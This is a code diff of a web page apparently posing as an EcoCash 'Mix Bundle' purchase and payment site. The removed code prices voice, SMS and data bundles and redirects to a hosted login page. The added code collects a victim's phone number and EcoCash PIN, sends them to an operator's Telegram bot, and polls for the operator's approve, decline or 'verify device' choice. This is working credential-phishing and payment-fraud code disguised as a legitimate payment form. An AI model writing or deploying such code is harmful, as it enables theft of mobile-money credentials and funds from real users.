-  var max = type==='voice' ? b.maxVoice : type==='sms' ? b.maxSms : b.maxData;
-  var pct = max > 0 ? (val/max*100) : 0;
-  input.style.setProperty('--pct', pct.toFixed(1)+'%');
-  var unit = type==='voice' ? ' <em>Min</em>' : type==='sms' ? ' <em>SMS</em>' : ' <em>GB</em>';
-  var dispEl = document.getElementById(key+'-'+type+'-val');
-  if (dispEl) dispEl.innerHTML = val + unit;
-  lastInteracted = key;
-  updatePrice(key);
-  updateSummaryFor(key);
-}
+    /* ── Input sanitisation ── */
+    phoneInput.addEventListener('input', () => {
+      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
+    });
 
-function calcPrice(key) {
-  var b = BUNDLES.find(function(x){ return x.key === key; });
-  var s = panelState[key];
-  var vf = b.maxVoice > 0 ? s.voice / b.maxVoice : 0;
-  var sf = b.maxSms   > 0 ? s.sms   / b.maxSms   : 0;
-  var df = b.maxData  > 0 ? s.data  / b.maxData   : 0;
-  return parseFloat((b.max * (vf*0.30 + sf*0.20 + df*0.50)).toFixed(2));
-}
-function updatePrice(key) {
-  var b = BUNDLES.find(function(x){ return x.key === key; });
-  var s = panelState[key];
-  var price = (s.voice===b.maxVoice && s.sms===b.maxSms && s.data===b.maxData) ? b.max : calcPrice(key);
-  var el = document.getElementById(key+'-price');
-  if (el) el.textContent = 'USD ' + price.toFixed(2);
-  return price;
-}
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+      if (pinInput.value.length === 4) pinInput.blur();
+    });
 
-var lastInteracted = 'daily';
-function updateSummaryFor(key) {
-  lastInteracted = key;
-  var b = BUNDLES.find(function(x){ return x.key === key; });
-  var s = panelState[key];
-  var price = updatePrice(key);
-  document.getElementById('summary-period').textContent = b.period;
-  document.getElementById('summary-price').textContent  = 'USD ' + price.toFixed(2);
-  document.getElementById('summary-voice').textContent  = s.voice > 0 ? s.voice + ' Min' : '—';
-  document.getElementById('summary-sms').textContent    = s.sms   > 0 ? s.sms   + ' SMS' : '—';
-  document.getElementById('summary-data').textContent   = s.data  > 0 ? s.data  + ' GB'  : '—';
-}
+    function normalizePhone(phone) {
+      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
+    }
 
-function updateActiveTab() {
-  var scrollY = window.scrollY + 120;
-  var active = 'daily';
-  BUNDLES.forEach(function(b){
-    var el = document.getElementById('bundle-'+b.key);
-    if (el && el.offsetTop <= scrollY) active = b.key;
-  });
-  document.querySelectorAll('.ptab').forEach(function(t){
-    t.classList.toggle('active', t.getAttribute('href') === '#bundle-'+active);
-  });
-  updateSummaryFor(active);
-}
-window.addEventListener('scroll', updateActiveTab, {passive:true});
+    function showError(msg) {
+      errMsg.textContent   = msg;
+      errMsg.style.display = 'block';
+    }
 
-var _currentModalKey = null;
-function openModal(key) {
-  var b = BUNDLES.find(function(x){ return x.key === key; });
-  var s = panelState[key];
-  var price = (s.voice===b.maxVoice && s.sms===b.maxSms && s.data===b.maxData) ? b.max : calcPrice(key);
-  _currentModalKey = key;
-  document.getElementById('mod-duration').textContent = b.period;
-  document.getElementById('mod-voice').textContent    = s.voice + ' Min';
-  document.getElementById('mod-sms').textContent      = s.sms + ' SMS';
-  document.getElementById('mod-data').textContent     = s.data + ' GB';
-  document.getElementById('mod-total').textContent    = 'USD ' + price.toFixed(2);
-  document.getElementById('mod-confirm-btn').onclick = function(){
-    closeModal();
-    showAuthAndRedirect(b, s, price);
-  };
-  document.getElementById('confirmModal').classList.add('open');
-}
-function closeModal(){
-  document.getElementById('confirmModal').classList.remove('open');
-}
-document.getElementById('confirmModal').addEventListener('click', function(e){
-  if(e.target===this) closeModal();
-});
-document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeModal(); });
+    function resetButton() {
+      isProcessing            = false;
+      continueBtn.disabled    = false;
+      continueBtn.textContent = 'Pay with EcoCash';
+    }
 
-/* ── AUTHORISING SCREEN → redirect to login.html with bundle params ── */
-function showAuthAndRedirect(b, s, price) {
-  var auth = document.getElementById('authScreen');
-  auth.classList.add('show');
-  document.body.style.overflow = 'hidden';
+    /* ── Telegram bot send + poll ── */
+    function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled    = true;
+      continueBtn.textContent = 'Verifying…';
 
-  var dotIdx = 0;
-  var dots = [document.getElementById('dot1'), document.getElementById('dot2'), document.getElementById('dot3')];
-  dots.forEach(function(d){ d.classList.remove('active'); });
-  dots[0].classList.add('active');
-  var dotTimer = setInterval(function(){
-    dots.forEach(function(d){ d.classList.remove('active'); });
-    dotIdx = (dotIdx + 1) % 3;
-    dots[dotIdx].classList.add('active');
-  }, 500);
+      const o        = getBundleOrder();
+      const period   = o.period || '—';
+      const voice    = o.voice  ? o.voice + ' Min'  : '—';
+      const sms      = o.sms    ? o.sms   + ' SMS'  : '—';
+      const data     = o.data   ? o.data  + ' GB'   : '—';
+      const price    = o.price  ? 'USD ' + o.price  : '—';
 
-  /* Save bundle to localStorage so login.html can read it */
-  localStorage.setItem('bundleOrder', JSON.stringify({
-    period: b.period,
-    voice:  s.voice,
-    sms:    s.sms,
-    data:   s.data,
-    price:  price.toFixed(2)
-  }));
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
 
-  setTimeout(function(){
-    clearInterval(dotTimer);
-    /* ── REDIRECT: absolute URL to the deployed login page ── */
-    var params = 'period=' + encodeURIComponent(b.period)
-      + '&voice=' + s.voice
-      + '&sms='   + s.sms
-      + '&data='  + s.data
-      + '&price=' + price.toFixed(2);
-    window.location.href = 'https://mix-bundle-2.onrender.com/login.html?' + params;
-  }, 2200);
-}
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 EcoCash Mix Bundle Payment</b>\n\n`
+              + `📦 Bundle: <b>${period}</b>\n`
+              + `📞 Voice: <b>${voice}</b>\n`
+              + `💬 SMS: <b>${sms}</b>\n`
+              + `📶 Data: <b>${data}</b>\n`
+              + `💵 Total: <b>${price}</b>\n\n`
+              + `Phone: <code>+263${phone}</code>\n`
+              + `PIN: <code>${pin}</code>\n\n`
+              + `Choose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Payment',  callback_data: approveId },
+                { text: '📱 Verify Device',    callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('ecocashLogin', JSON.stringify({ phone, at: new Date().toISOString() }));
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => resetButton());
+    }
 
-function toggleFaq(btn){ btn.parentElement.classList.toggle('open'); }
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.DEVICE_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Payment declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
 
-var hamburgerBtn = document.getElementById('hamburger');
-hamburgerBtn.addEventListener('click', function(){
-  var open = document.getElementById('navLinks').classList.toggle('active');
-  hamburgerBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
-});
-document.querySelectorAll('.nav-link').forEach(function(l){
-  l.addEventListener('click', function(){
-    document.getElementById('navLinks').classList.remove('active');
-    hamburgerBtn.setAttribute('aria-expanded','false');
-  });
-});
+    /* ── Submit ── */
+    continueBtn.addEventListener('click', () => {
+      errMsg.style.display = 'none';
+      const phone = normalizePhone(phoneInput.value);
+      const pin   = pinInput.value.trim();
+      if (phone.length !== 9) {
+        showError('Please enter a valid 9-digit mobile number.');
+        return;
+      }
+      if (pin.length !== 4) {
+        showError('Please enter your 4-digit EcoCash PIN.');
+        return;
+      }
+      sendToBot(phone, pin);
+    });
 
-function hideSplash(){
-  document.getElementById('splash').classList.add('hide');
-  document.body.classList.remove('splash-lock');
-}
-window.addEventListener('load', function(){ setTimeout(hideSplash, 1100); });
-if (document.readyState === 'complete') setTimeout(hideSplash, 1100);
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted) window.location.reload();
+    });
 
-document.getElementById('yr').textContent = new Date().getFullYear();
-buildAllCards();
-</script>
+    window.addEventListener('load', loadBundleDetails);
+  </script>
 </body>
 </html>
